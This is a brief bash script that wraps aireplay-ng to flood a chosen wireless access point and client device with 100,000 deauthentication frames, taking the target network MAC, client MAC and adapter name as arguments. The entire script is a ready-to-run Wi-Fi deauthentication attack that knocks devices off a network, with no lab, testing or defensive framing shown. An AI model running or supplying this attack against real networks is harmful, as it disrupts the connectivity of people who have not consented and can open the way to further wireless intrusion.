#!/bin/bash

# 1 = Mac Address of target network
# 2 = Mac Address of client device
# 3 = Name of wireless adapter
aireplay-ng --deauth 100000 -a $1 -c $2 -D $3
